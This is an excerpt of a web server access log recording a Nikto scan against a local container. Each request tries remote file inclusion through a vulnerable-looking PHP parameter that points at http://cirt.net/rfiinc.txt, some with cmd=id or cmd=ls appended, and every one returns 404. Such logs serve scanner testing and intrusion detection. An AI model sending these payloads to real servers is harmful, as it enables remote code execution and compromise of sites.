172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/poll/showpoll.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005443)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005444)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/presence/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005445)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/projects/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005446)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/projects/list.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005447)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/projects/summary.inc.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005448)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/punish/p_error.php?exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005449)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/punish/profile.php?exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005450)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/reports/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005451)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/search/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005452)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005453)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005454)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/settings/headerfile.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005455)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/snf/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005456)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/syslog/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005457)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/tasks/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005458)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/tasks/searchsimilar.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005459)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/tasks/summary.inc.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005460)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/threadstop/threadstop.php?exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005461)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/tinycontent/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005462)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/tml/block.tag.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005463)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/tsdisplay4xoops/blocks/tsdisplay4xoops_block2.php?xoops_url=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005464)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/useradm/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005465)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/users/headerfile.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005466)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/vWar_Account/includes/functions_common.php?vwar_root2=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005467)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/visitors2/include/config.inc.php?lvc_include_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005468)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005469)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/wiwimod/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005470)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/xfsection/modify.php?dir_module=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005471)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005472)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005473)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005474)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modulistica/mdl_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005475)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modx-0.9.6.2/assets/snippets/reflect/snippet.reflect.php?reflect_base=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005476)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /moodle/admin/utfdbmigrate.php?cmd=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005477)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /moosegallery/display.php?type=http://cirt.net/rfiinc.txt??&cmd=[command] HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005478)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mostlyce/jscripts/tiny_mce/plugins/htmltemplate/htmltemplate.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005479)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /moteur/moteur.php?chemin=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005480)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /movie_cls.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005481)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /msDb.php?GLOBALS[ini_array][EXTLIB_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005482)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /music/buycd.php?HTTP_DOCUMENT_ROOT=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005483)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mutant_includes/mutant_functions.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005484)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mxBB/modules/kb_mods/includes/kb_constants.php?module_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005485)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mxBB/modules/mx_newssuite/includes/newssuite_constants.php?mx_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005486)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mygallery/myfunctions/mygallerybrowser.php?myPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005487)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /myphpcommander_path/system/lib/package.php?gl_root=http://cirt.net/rfiinc.txt??cmd HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005488)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mysave.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005489)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /naboard_pnr.php?skin=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005490)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ncaster/admin/addons/archive/archive.php?adminfolder=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005491)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /network_module_selector.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005492)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news.php?CONFIG[script_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005493)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005494)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news.php?scriptpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005495)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005496)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005497)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news/include/createdb.php?langfile;=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005498)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news/include/customize.php?l=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005499)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news/newstopic_inc.php?indir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005500)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /news/scripts/news_page.php?script_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005501)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /newsadmin.php?action=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005502)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /newsarchive.php?path_to_script=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005503)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /newsfeeds/includes/aggregator.php?zf_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005504)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /newsfeeds/includes/controller.php?zf_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005505)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /newsletter/newsletter.php?waroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005506)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /newsp/lib/class.Database.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005507)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /newticket.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005508)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /noah/modules/noevents/templates/mfa_theme.php?tpls[1]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005509)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /noticias.php?inc=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005510)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /nucleus/plugins/skinfiles/index.php?DIR_LIBS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005511)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /nuke_path/iframe.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005512)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /nukebrowser.php?filnavn=http://cirt.net/rfiinc.txt?&filhead=XXpathXX&cmd=id HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005513)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /nuseo/admin/nuseo_admin_d.php?nuseo_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005514)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /nuseo/admin/nuseo_admin_d.php?nuseo_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005515)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /oaboard_en/forum.php?inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005516)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ocp-103/index.php?req_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005517)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ocs/include/footer.inc.php?fullpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005518)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ocs/include/theme.inc.php?fullpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005519)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ocs/openemr-2.8.2/custom/import_xml.php?srcdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005520)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /olbookmarks-0.7.4/themes/test1.php?http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005521)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /oneadmin/adminfoot.php?path[docroot]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005522)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /oneadmin/blogger/sampleblogger.php?path[docroot]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005523)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /oneadmin/config-bak.php?include_once=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005524)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /oneadmin/config.php?path[docroot]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005525)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /oneadmin/ecommerce/sampleecommerce.php?path[docroot]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005526)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /online.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005527)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /open-admin/plugins/site_protection/index.php?config%5boi_dir%5d=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005528)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /openi-admin/base/fileloader.php?config[openi_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005529)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /openrat/themes/default/include/html/insert.inc.php?tpl_dir=http://cirt.net/rfiinc.txt???? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005530)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /opensurveypilot/administration/user/lib/group.inc.php?cfgPathToProjectAdmin=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005531)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ops/gals.php?news_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005532)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /order/login.php?svr_rootscript=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005533)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /osData/php121/php121db.php?php121dir=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005534)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ossigeno-suite-2.2_pre1/upload/xax/admin/modules/uninstall_module.php?level=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 560 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005535)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ossigeno_modules/ossigeno-catalogo/xax/ossigeno/catalogo/common.php?ossigeno=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 558 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005536)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /owimg.php3?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005537)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /p-news.php?pn_lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005538)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pafiledb/includes/pafiledb_constants.php?module_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005539)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /page.php?goto=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005540)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /page.php?id=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005541)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /panel/common/theme/default/header_setup.php?path[docroot]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005542)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /param_editor.php?folder=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005543)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /parse/parser.php?WN_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005544)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /patch/?language_id=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005545)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /patch/tools/send_reminders.php?noSet=0&includedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005546)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /paypalipn/ipnprocess.php?INC=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005547)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pda/pda_projects.php?offset=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005548)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phfito/phfito-post?SRC_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005549)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005550)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /photo_comment.php?toroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005551)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /php-inc/log.inc.php?SKIN_URL=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005552)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /php-include-robotsservices.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005553)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /php-nuke/modules/Forums/admin/admin_styles.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005554)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /php.incs/common.inc.php?cm_basedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005555)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /php/init.gallery.php?include_class=http://cirt.net/rfiinc.txt?/something HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005556)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /php121db.php?php121dir=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005557)"
